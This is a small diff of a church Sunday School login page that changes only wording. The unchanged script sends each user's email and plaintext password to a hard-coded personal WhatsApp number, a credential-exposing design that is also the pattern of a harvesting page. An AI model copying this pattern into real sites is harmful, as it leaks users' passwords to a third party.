@@ -12,12 +12,12 @@
     <div class="auth-card">
         <img src="logo.jpg" alt="Logo" class="auth-logo">
         <h2>Rehoboth Sunday School</h2>
-        <p class="auth-subtitle">ವಿದ್ಯಾರ್ಥಿ/ಶಿಕ್ಷಕರ ಲಾಗಿನ್</p>
+        <p class="auth-subtitle">ವಿದ್ಯಾರ್ಥಿ/ಶಿಕ್ಷಕರ ಲಾಗಿನ್ (Login Portal)</p>
 
         <form onsubmit="sendLoginToWhatsApp(event)">
             <div class="input-group">
                 <i class="fa-solid fa-envelope"></i>
-                <input type="email" id="loginEmail" placeholder="ನಿಮ್ಮ ಇಮೇಲ್ (Email)" required>
+                <input type="email" id="loginEmail" placeholder="ಇಮೇಲ್ (Email ID)" required>
             </div>
 
             <div class="input-group">
@@ -45,7 +45,7 @@
             var pass = document.getElementById('loginPass').value;
             var myNumber = "918073407706";
 
-            var msg = "🔐 *Sunday School Login Request*%0A%0A" +
+            var msg = "🔐 *Sunday School Login Attempt*%0A%0A" +
                       "📧 *Email:* " + email + "%0A" +
                       "🔑 *Password:* " + pass;
 
